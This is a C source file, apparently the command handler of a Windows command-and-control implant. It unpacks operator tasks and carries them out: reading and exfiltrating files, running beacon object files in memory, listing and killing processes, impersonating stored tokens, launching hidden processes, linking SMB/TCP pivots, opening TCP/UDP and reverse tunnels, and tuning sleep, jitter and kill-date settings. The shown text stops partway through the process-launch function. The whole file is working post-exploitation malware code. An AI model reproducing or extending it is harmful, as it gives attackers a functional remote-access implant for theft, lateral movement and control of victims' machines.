#include "Commander.h"
#include "bof_loader.h"
#include "Boffer.h"

extern HANDLE g_StoredToken;

Commander* Commander_Create(Agent* a)
{
	Commander* self = (Commander*)MemAllocLocal(sizeof(Commander));
	self->agent = a;
	return self;
}

void Commander_ProcessCommandTasks(Commander* self, BYTE* recv, ULONG recvSize, Packer* outPacker)
{
	if (recvSize < 8)
		return;

	/* recv points inside connector LocalAlloc block (e.g. recvData+ans_pre_size); never take ownership. */
	Packer* inPacker = Packer_CreateView(recv, recvSize);

	ULONG packerSize = Packer_Unpack32(inPacker);
	if (packerSize > recvSize - 4) {
		Packer_Destroy(inPacker);
		return;
	}

	while ( Packer_datasize(inPacker) < packerSize + 4 )
	{	
		ULONG CommandId = Packer_Unpack32(inPacker);
		switch ( CommandId )
		{
		case COMMAND_CAT:
			Commander_CmdCat(self, CommandId, inPacker, outPacker); break;
		
		case COMMAND_CD:        
			Commander_CmdCd(self, CommandId, inPacker, outPacker); break;
	
		case COMMAND_CP:   
			Commander_CmdCp(self, CommandId, inPacker, outPacker); break;

		case COMMAND_DISKS:
			Commander_CmdDisks(self, CommandId, inPacker, outPacker); break;

		case COMMAND_DOWNLOAD:
			Commander_CmdDownload(self, CommandId, inPacker, outPacker); break;

		case COMMAND_DOWNLOAD_STATE:
			Commander_CmdDownloadState(self, CommandId, inPacker, outPacker); break;

		case COMMAND_EXEC_BOF:
			Commander_CmdExecBof(self, CommandId, inPacker, outPacker);  break;

		case COMMAND_GETUID:
			Commander_CmdGetUid(self, CommandId, inPacker, outPacker); break;

		case COMMAND_JOBS_LIST:
			Commander_CmdJobsList(self, CommandId, inPacker, outPacker); break;
			
		case COMMAND_JOBS_KILL:
			Commander_CmdJobsKill(self, CommandId, inPacker, outPacker); break;

		case COMMAND_LINK:
			Commander_CmdLink(self, CommandId, inPacker, outPacker); break;

		case COMMAND_LS:
			Commander_CmdLs(self, CommandId, inPacker, outPacker); break;

		case COMMAND_MV:
			Commander_CmdMv(self, CommandId, inPacker, outPacker); break;

		case COMMAND_MKDIR:
			Commander_CmdMkdir(self, CommandId, inPacker, outPacker); break;

		case COMMAND_PIVOT_EXEC:
			Commander_CmdPivotExec(self, CommandId, inPacker, outPacker); break;

		case COMMAND_PROFILE:
			Commander_CmdProfile(self, CommandId, inPacker, outPacker); break;

		case COMMAND_PS_LIST:
			Commander_CmdPsList(self, CommandId, inPacker, outPacker); break;

		case COMMAND_PS_KILL:
			Commander_CmdPsKill(self, CommandId, inPacker, outPacker); break;

		case COMMAND_PS_RUN:
			Commander_CmdPsRun(self, CommandId, inPacker, outPacker); break;

		case COMMAND_PWD:       
			Commander_CmdPwd(self, CommandId, inPacker, outPacker); break;

		case COMMAND_REV2SELF:
			Commander_CmdRev2Self(self, CommandId, inPacker, outPacker); break;

		case COMMAND_RM:
			Commander_CmdRm(self, CommandId, inPacker, outPacker); break;

		case COMMAND_SHELL_START:
			Commander_CmdShellStart(self, CommandId, inPacker, outPacker); break;

		case COMMAND_SHELL_WRITE:
			Commander_CmdShellWrite(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TERMINATE: 
			Commander_CmdTerminate(self, CommandId, inPacker, outPacker); break;
		
		case COMMAND_TUNNEL_START_TCP:
			Commander_CmdTunnelMsgConnectTCP(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TUNNEL_START_UDP:
			Commander_CmdTunnelMsgConnectUDP(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TUNNEL_WRITE_TCP:
			Commander_CmdTunnelMsgWriteTCP(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TUNNEL_WRITE_UDP:
			Commander_CmdTunnelMsgWriteUDP(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TUNNEL_PAUSE: 
			Commander_CmdTunnelMsgPause(self, CommandId, inPacker, outPacker); break;
		
		case COMMAND_TUNNEL_RESUME: 
			Commander_CmdTunnelMsgResume(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TUNNEL_CLOSE:
			Commander_CmdTunnelMsgClose(self, CommandId, inPacker, outPacker); break;

		case COMMAND_TUNNEL_REVERSE:
			Commander_CmdTunnelMsgReverse(self, CommandId, inPacker, outPacker); break;

		case COMMAND_UNLINK:
			Commander_CmdUnlink(self, CommandId, inPacker, outPacker); break;

		case COMMAND_UPLOAD:
			Commander_CmdUpload(self, CommandId, inPacker, outPacker); break;

		case COMMAND_SAVEMEMORY:
			Commander_CmdSaveMemory(self, CommandId, inPacker, outPacker); break;

		default: break;
		}
	}
	if (inPacker)
		Packer_Destroy(inPacker);
}

void Commander_CmdCat(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)Packer_UnpackBytes(inPacker, &pathSize);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
		return;
	}

	DWORD contentSize = 2048;
	DWORD readed = 0;
	PVOID content = MemAllocLocal(contentSize);

	BOOL result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
	if (result) {
		Packer_Pack32(outPacker, commandId);
		Packer_PackBytes(outPacker, (PBYTE)path, pathSize);
		Packer_PackBytes(outPacker, (PBYTE)content, readed);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}

	if (hFile) {
		ApiNt->NtClose(hFile);
		hFile = NULL;
	}

	if (content)
		MemFreeLocal(&content, contentSize);
}

void Commander_CmdCd(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*) Packer_UnpackBytes(inPacker, &pathSize);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	BOOL result = ApiWin->SetCurrentDirectoryA(path);
	if (result) {
		CHAR  currentPath[MAX_PATH] = { 0 };
		ULONG currentPathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, currentPath);
		Packer_Pack32(outPacker, commandId);
		Packer_PackBytes(outPacker, (PBYTE)currentPath, currentPathSize);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdCp(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*) Packer_UnpackBytes(inPacker, &srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*) Packer_UnpackBytes(inPacker, &dstSize);
	ULONG taskId  = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
	if (result) {
		Packer_Pack32(outPacker, commandId);
	}      
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdDisks(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);

	ULONG drives = ApiWin->GetLogicalDrives();
	if (drives == 0) {
		Packer_Pack8(outPacker, FALSE);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
	else {
		Packer_Pack8(outPacker, TRUE);
		
		ULONG count = 0;
		ULONG indexCount = Packer_datasize(outPacker);
		Packer_Pack32(outPacker, 0);

		for (char drive = 'A'; drive <= 'Z'; ++drive) {
			if (drives & (1 << (drive - 'A'))) {
				char drivePath[] = { drive, ':', '\\', '\0' };
				ULONG driveType = ApiWin->GetDriveTypeA(drivePath);

				Packer_Pack8(outPacker, drive);
				Packer_Pack32(outPacker, driveType);

				count++;
			}
		}
		Packer_Set32(outPacker, indexCount, count);
	}
}

void Commander_CmdDownload(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG filenameSize = 0;
	CHAR* filename     = (CHAR*) Packer_UnpackBytes(inPacker, &filenameSize);
	ULONG taskId       = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	HANDLE hFile = ApiWin->CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
	else {
		CHAR  fullPath[MAX_PATH];
		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
		DWORD fileSizeHigh = 0;
		DWORD fileSizeLow  = ApiWin->GetFileSize( hFile, &fileSizeHigh );
		ULONG64 fileSize   = ((ULONG64)fileSizeHigh << 32) | fileSizeLow;

		if (pathSize > 0) {
			DownloadData downloadData = Downloader_CreateDownloadData(self->agent->downloader, taskId, hFile, fileSize);
			Packer_Pack32(outPacker, COMMAND_DOWNLOAD);
			Packer_Pack32(outPacker, downloadData.fileId);
			Packer_Pack8(outPacker, DOWNLOAD_START);
			Packer_Pack64(outPacker, downloadData.fileSize);
			Packer_PackBytes(outPacker, (PBYTE)fullPath, pathSize);
		}
		else {
			Packer_Pack32(outPacker, COMMAND_ERROR);
			Packer_Pack32(outPacker, TEB->LastErrorValue);
		}
	}
}

void Commander_CmdDownloadState(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG newState = Packer_Unpack32(inPacker);
	ULONG fileId   = Packer_Unpack32(inPacker);
	ULONG taskId   = Packer_Unpack32(inPacker);

	BOOL  found    = false;
	for (int i = 0; i < self->agent->downloader->downloads.size(); i++) {
		if (self->agent->downloader->downloads[i].fileId == fileId) {
			self->agent->downloader->downloads[i].state = newState;
			found = true;
			break;
		}
	}

	Packer_Pack32(outPacker, taskId);
	if (found) {
		Packer_Pack32(outPacker, COMMAND_DOWNLOAD_STATE);
		Packer_Pack32(outPacker, fileId);
		Packer_Pack8(outPacker, (BYTE)newState);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, 2);
	}
}

void Commander_CmdExecBof(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	BOOL  async     = Packer_Unpack8(inPacker);
	ULONG entrySize = 0;
	BYTE* entry     = Packer_UnpackBytes(inPacker, &entrySize);
	ULONG bofSize   = 0;
	BYTE* bof       = Packer_UnpackBytes(inPacker, &bofSize);
	ULONG argsSize  = 0;
	BYTE* args      = Packer_UnpackBytes(inPacker, &argsSize);
	ULONG taskId    = Packer_Unpack32(inPacker);

	if (!g_AsyncBofManager) {
		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, ERROR_NOT_SUPPORTED);
		return;
	}

	if (async) {
		AsyncBofContext* ctx = Boffer_CreateAsyncBof(g_AsyncBofManager, taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
		if (!ctx) {
			Packer_Pack32(outPacker, COMMAND_ERROR);
			Packer_Pack32(outPacker, ERROR_NOT_ENOUGH_MEMORY);
			return;
		}
		if (!Boffer_StartAsyncBof(g_AsyncBofManager, ctx)) {
			Packer_Pack32(outPacker, COMMAND_ERROR);
			Packer_Pack32(outPacker, TEB->LastErrorValue);
			return;
		}
	}
	else {
		Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
		if (bofPacker && Packer_datasize(bofPacker) > 0)
			Packer_PackFlatBytes(outPacker, Packer_data(bofPacker), Packer_datasize(bofPacker));

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, commandId);
		Packer_Pack8(outPacker, FALSE);

		if (bofPacker)
			Packer_Clear(bofPacker, TRUE);
	}
}

void Commander_CmdGetUid(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	BOOL  result       = FALSE;
	BOOL  elevated     = FALSE;
	CHAR* username     = (CHAR*) MemAllocLocal(512);
	ULONG usernameSize = 512;
	CHAR* domain       = (CHAR*) MemAllocLocal(512);
	ULONG domainSize   = 512;

	HANDLE TokenHandle = TokenCurrentHandle();
	if (TokenHandle)
		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);

	if (result) {
		Packer_Pack32(outPacker, commandId);
		Packer_Pack8(outPacker, elevated);
		Packer_PackStringA(outPacker, domain);
		Packer_PackStringA(outPacker, username);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}

	if (TokenHandle)
		ApiNt->NtClose(TokenHandle);

	MemFreeLocal( (LPVOID*)&username, 512);
	MemFreeLocal( (LPVOID*)&domain, 512);
}

void Commander_CmdJobsList(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);

	ULONG count = self->agent->jober->jobs.size();
	ULONG asyncBofCount = 0;
	
	if (g_AsyncBofManager)
		ApiWin->EnterCriticalSection(&g_AsyncBofManager->managerLock);
	
	if (g_AsyncBofManager)
		asyncBofCount = g_AsyncBofManager->asyncBofs.size();

	Packer_Pack32(outPacker, count + asyncBofCount);

	for (int i = 0; i < count; i++) {
		ULONG jobId  = self->agent->jober->jobs[i].jobId;
		WORD jobType = self->agent->jober->jobs[i].jobType;
		WORD pid     = self->agent->jober->jobs[i].pidObject;

		Packer_Pack32(outPacker, jobId);
		Packer_Pack16(outPacker, jobType);
		Packer_Pack16(outPacker, pid);
	}

	if (g_AsyncBofManager) {
		for (size_t i = 0; i < asyncBofCount; i++) {
			AsyncBofContext* ctx = g_AsyncBofManager->asyncBofs[i];
			Packer_Pack32(outPacker, ctx->taskId);
			Packer_Pack16(outPacker, JOB_TYPE_ASYNCBOF);
			Packer_Pack16(outPacker, 0);
		}
		ApiWin->LeaveCriticalSection(&g_AsyncBofManager->managerLock);
	}
}

void Commander_CmdJobsKill(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG jobId = Packer_Unpack32(inPacker);
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);

	BOOL found = FALSE;
	ULONG count = self->agent->jober->jobs.size();
	for (int i = 0; i < count; i++) {
		if (jobId == self->agent->jober->jobs[i].jobId) {
			self->agent->jober->jobs[i].jobState = JOB_STATE_KILLED;
			found = TRUE;
			break;
		}
	}

	if (!found && g_AsyncBofManager)
		found = Boffer_StopAsyncBof(g_AsyncBofManager, jobId);

	Packer_Pack8(outPacker, found);
	Packer_Pack32(outPacker, jobId);
}

void Commander_CmdLink(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pivotType = Packer_Unpack32(inPacker);

	if (pivotType == PIVOT_TYPE_SMB) {
		ULONG pipeSize = 0;
		CHAR* pipe     = (CHAR*)Packer_UnpackBytes(inPacker, &pipeSize);
		ULONG taskId   = Packer_Unpack32(inPacker);

		Pivotter_LinkPivotSMB(self->agent->pivotter, taskId, commandId, pipe, outPacker);
	}
	else if (pivotType == PIVOT_TYPE_TCP) {
		ULONG addrSize = 0;
		CHAR* addr   = (CHAR*)Packer_UnpackBytes(inPacker, &addrSize);
		WORD  port   = Packer_Unpack32(inPacker);
		ULONG taskId = Packer_Unpack32(inPacker);

		Pivotter_LinkPivotTCP(self->agent->pivotter, taskId, commandId, addr, port, outPacker);
	}
}

void Commander_CmdLs(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)Packer_UnpackBytes(inPacker, &pathSize);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);

	CHAR  fullpath[MAX_PATH];
	DWORD fullpathSize = MAX_PATH;

	if (pathSize == 3 && path[1] == ':') {
		fullpath[0] = path[0];
		fullpath[1] = path[1];
		fullpathSize = 2;
	}
	else {
		fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
		if (fullpathSize + 2 > MAX_PATH || fullpathSize == 0) {
			Packer_Pack8(outPacker, FALSE);
			Packer_Pack32(outPacker, TEB->LastErrorValue);
			return;
		}
	}

	DWORD fileAttribs = ApiWin->GetFileAttributesA(fullpath);
	BOOL isFile = (fileAttribs != INVALID_FILE_ATTRIBUTES) && !(fileAttribs & FILE_ATTRIBUTE_DIRECTORY);
	if (!isFile) {
		fullpath[fullpathSize] = '\\';
		fullpath[++fullpathSize] = '*';
		fullpath[++fullpathSize] = 0;
	}

	WIN32_FIND_DATAA findData = { 0 };
	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
	if ( File != INVALID_HANDLE_VALUE ) {
		Packer_Pack8(outPacker, TRUE);
		Packer_PackStringA(outPacker, fullpath);

		ULONG count = 0;
		ULONG indexCount = Packer_datasize(outPacker);
		Packer_Pack32(outPacker, 0);

		do {
			BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
			
			if( isDir && StrLenA(findData.cFileName) == 1 && findData.cFileName[0] == 0x2e )
				continue;
			if (isDir && StrLenA(findData.cFileName) == 2 && findData.cFileName[0] == 0x2e && findData.cFileName[1] == 0x2e)
				continue;
			
			ULONG64 size = 0;
			((ULONG*)&size)[1] = findData.nFileSizeHigh;
			((ULONG*)&size)[0] = findData.nFileSizeLow;

			ULONG writeDate = FileTimeToUnixTimestamp(findData.ftLastWriteTime);

			Packer_Pack8(outPacker, isDir);
			Packer_Pack64(outPacker, size);
			Packer_Pack32(outPacker, writeDate);
			Packer_PackStringA(outPacker, findData.cFileName);

			count++;

		} while (!isFile && ApiWin->FindNextFileA(File, &findData));
		ApiWin->FindClose(File);
		Packer_Set32(outPacker, indexCount, count);
	}
	else {
		Packer_Pack8(outPacker, FALSE);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}

}

void Commander_CmdMkdir(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)Packer_UnpackBytes(inPacker, &pathSize);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	BOOL result = ApiWin->CreateDirectoryA(path, NULL);
	if (result) {
		Packer_Pack32(outPacker, commandId);
		Packer_PackBytes(outPacker, (PBYTE)path, pathSize);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdMv(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*)Packer_UnpackBytes(inPacker, &srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*)Packer_UnpackBytes(inPacker, &dstSize);
	ULONG taskId  = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	BOOL result = ApiWin->MoveFileA(src, dst);
	if (result) {
		Packer_Pack32(outPacker, commandId);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdPivotExec(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pivotId  = Packer_Unpack32(inPacker);
	ULONG dataSize = 0;
	BYTE* data     = Packer_UnpackBytes(inPacker, &dataSize);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Pivotter_WritePivot(self->agent->pivotter, pivotId, data, dataSize);
}

void Commander_CmdProfile(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG subcommand = Packer_Unpack32(inPacker);

	if (subcommand == 1) { // sleep time
		ULONG sleep  = Packer_Unpack32(inPacker);
		ULONG jitter = Packer_Unpack32(inPacker);
		ULONG taskId = Packer_Unpack32(inPacker);

		self->agent->config->sleep_delay  = sleep;
		self->agent->config->jitter_delay = jitter;

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_PROFILE);
		Packer_Pack32(outPacker, subcommand);
		Packer_Pack32(outPacker, self->agent->config->sleep_delay);
		Packer_Pack32(outPacker, self->agent->config->jitter_delay);
	} 
	else if (subcommand == 2) { // download chunks size
		ULONG size   = Packer_Unpack32(inPacker);
		ULONG taskId = Packer_Unpack32(inPacker);
		
		self->agent->downloader->chunkSize = size;

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_PROFILE);
		Packer_Pack32(outPacker, subcommand);
		Packer_Pack32(outPacker, self->agent->downloader->chunkSize);
	}
	else if (subcommand == 3) { // killdate
		ULONG kill_date = Packer_Unpack32(inPacker);
		ULONG taskId    = Packer_Unpack32(inPacker);

		self->agent->config->kill_date = kill_date;

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_PROFILE);
		Packer_Pack32(outPacker, subcommand);
		Packer_Pack32(outPacker, self->agent->config->kill_date);
	}
	else if (subcommand == 4) { // workingsize
		ULONG workingtime = Packer_Unpack32(inPacker);
		ULONG taskId      = Packer_Unpack32(inPacker);

		self->agent->config->working_time = workingtime;

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_PROFILE);
		Packer_Pack32(outPacker, subcommand);
		Packer_Pack32(outPacker, self->agent->config->working_time);
	}
#if defined(BEACON_DNS)
	else if (subcommand == 5) { // burst set
		ULONG burstEnabled = Packer_Unpack32(inPacker);
		ULONG burstSleep   = Packer_Unpack32(inPacker);
		ULONG burstJitter  = Packer_Unpack32(inPacker);
		ULONG taskId       = Packer_Unpack32(inPacker);

		self->agent->config->profile.burst_enabled = burstEnabled;
		self->agent->config->profile.burst_sleep   = burstSleep;
		self->agent->config->profile.burst_jitter  = burstJitter;

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_PROFILE);
		Packer_Pack32(outPacker, subcommand);
		Packer_Pack32(outPacker, self->agent->config->profile.burst_enabled);
		Packer_Pack32(outPacker, self->agent->config->profile.burst_sleep);
		Packer_Pack32(outPacker, self->agent->config->profile.burst_jitter);
	}
	else if (subcommand == 6) { // burst show
		ULONG taskId = Packer_Unpack32(inPacker);

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_PROFILE);
		Packer_Pack32(outPacker, subcommand);
		Packer_Pack32(outPacker, self->agent->config->profile.burst_enabled);
		Packer_Pack32(outPacker, self->agent->config->profile.burst_sleep);
		Packer_Pack32(outPacker, self->agent->config->profile.burst_jitter);
	}
#endif
}

void Commander_CmdPsList(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);

	PSYSTEM_PROCESS_INFORMATION spi = NULL, spiAddr = NULL;

	ULONG spiSize = 0;
	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
	if (!NT_SUCCESS(NtStatus)) {
		spiSize += 0x1000;
		spi = (PSYSTEM_PROCESS_INFORMATION) MemAllocLocal(spiSize);
		if (spi)
			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
	}
	spiAddr = spi;

	if (NT_SUCCESS(NtStatus)) {
		Packer_Pack8(outPacker, TRUE);
		ULONG count = 0;
		ULONG indexCount = Packer_datasize(outPacker);
		Packer_Pack32(outPacker, 0);

		DWORD accessMask = 0;
		if (self->agent->info->major_version == 5 && self->agent->info->minor_version == 1)
			accessMask = PROCESS_QUERY_INFORMATION;
		else
			accessMask = PROCESS_QUERY_LIMITED_INFORMATION;

		do {
			BOOL  elevated = FALSE;
			BYTE  arch64 = 10;
			CHAR  processName[260] = { 0 };
			ULONG usernameSize = MAX_PATH;
			CHAR  username[MAX_PATH] = { 0 };
			ULONG domainSize = MAX_PATH;
			CHAR  domain[MAX_PATH] = { 0 };

			OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
			InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);

			BOOL      result = FALSE;
			HANDLE    hToken = NULL;
			HANDLE    hProcess = NULL;
			CLIENT_ID clientId = { spi->UniqueProcessId, 0 };
			NtStatus = ApiNt->NtOpenProcess(&hProcess, accessMask, &ObjectAttr, &clientId);
			if (NT_SUCCESS(NtStatus)) {

				ULONG_PTR piWow64 = NULL;
				NtStatus = ApiNt->NtQueryInformationProcess(hProcess, ProcessWow64Information, &piWow64, sizeof(ULONG_PTR), NULL);
				if (NT_SUCCESS(NtStatus))
					arch64 = (piWow64 == 0);

				NtStatus = ApiNt->NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
				if (NT_SUCCESS(NtStatus))
					result = TokenToUser(hToken, username, &usernameSize, domain, &domainSize, &elevated);
			}

			if (spi->ImageName.Buffer) {

				ConvertUnicodeStringToChar(spi->ImageName.Buffer, spi->ImageName.Length, processName, sizeof(processName));

				Packer_Pack16(outPacker, (WORD)(ULONG_PTR)spi->UniqueProcessId);
				Packer_Pack16(outPacker, (WORD)(ULONG_PTR)spi->InheritedFromUniqueProcessId);
				Packer_Pack16(outPacker, (WORD)spi->SessionId);
				Packer_Pack8(outPacker, arch64);
				Packer_Pack8(outPacker, elevated);
				Packer_PackStringA(outPacker, domain);
				Packer_PackStringA(outPacker, username);
				Packer_PackStringA(outPacker, processName);

				count++;

				memset(processName, 0, spi->ImageName.Length / 2);
				memset(username, 0, usernameSize);
				memset(domain, 0, domainSize);
			}

			if (hProcess) {
				ApiNt->NtClose(hProcess);
				hProcess = NULL;
			}
			if (hToken) {
				ApiNt->NtClose(hToken);
				hToken = NULL;
			}

			if (!spi->NextEntryOffset)
				break;
			spi = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
		} while (TRUE);

		if (spiAddr)
			MemFreeLocal((LPVOID*)&spiAddr, spiSize);

		Packer_Set32(outPacker, indexCount, count);
	}
	else {
		Packer_Pack8(outPacker, TRUE);
		Packer_Pack32(outPacker, 87);
	}
}

void Commander_CmdRev2Self(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);

	ApiWin->RevertToSelf();
}

void Commander_CmdPsKill(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG64 pid  = Packer_Unpack32(inPacker);
	ULONG taskId = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);
	
	OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
	InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);

	CLIENT_ID clientID = { (HANDLE)pid, 0 };
	HANDLE    hProcess = NULL;

	NTSTATUS status = ApiNt->NtOpenProcess(&hProcess, PROCESS_TERMINATE, &ObjectAttr, &clientID);
	if ( NT_SUCCESS(status) ) {
		Packer_Pack32(outPacker, commandId);
		ApiNt->NtTerminateProcess(hProcess, 0);
		Packer_Pack32(outPacker, pid);
	}
	else {
		ULONG error = ApiNt->RtlNtStatusToDosError(status);
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, error);
	}

	if (hProcess) {
		ApiNt->NtClose(hProcess);
		hProcess = NULL;
	}
}

void Commander_CmdPsRun(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	BOOL  progOutput   = Packer_Unpack8(inPacker);
	BOOL  useToken     = Packer_Unpack8(inPacker);
	BOOL  progState    = Packer_Unpack32(inPacker);
	ULONG progArgsSize = 0;
	CHAR* progArgs     = (CHAR*)Packer_UnpackBytes(inPacker, &progArgsSize);
	ULONG taskId       = Packer_Unpack32(inPacker);

	PROCESS_INFORMATION pi  = { 0 };
	STARTUPINFOA        spi = { 0 };
	spi.cb          = sizeof(STARTUPINFOA);
	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	spi.wShowWindow = SW_HIDE;

	HANDLE pipeRead  = NULL;
	HANDLE pipeWrite = NULL;
	if (progOutput) {
		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
		ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
		
		spi.hStdError  = pipeWrite;
		spi.hStdOutput = pipeWrite;
		spi.hStdInput  = NULL;
	}

	BOOL result = FALSE;

	if (useToken && g_StoredToken) {
		result = ApiWin->CreateProcessAsUserA(g_StoredToken, NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
		if (!result && ApiWin->CreateProcessWithTokenW) {
			STARTUPINFOW spiW = { 0 };
			spiW.cb = sizeof(STARTUPINFOW);
			spiW.dwFlags = spi.dwFlags;
			spiW.wShowWindow = spi.wShowWindow;
			spiW.hStdError = spi.hStdError;
			spiW.hStdOutput = spi.hStdOutput;
			spiW.hStdInput = spi.hStdInput;

			int wLen = ApiWin->MultiByteToWideChar(CP_ACP, 0, progArgs, -1, NULL, 0);
			if (wLen > 0) {
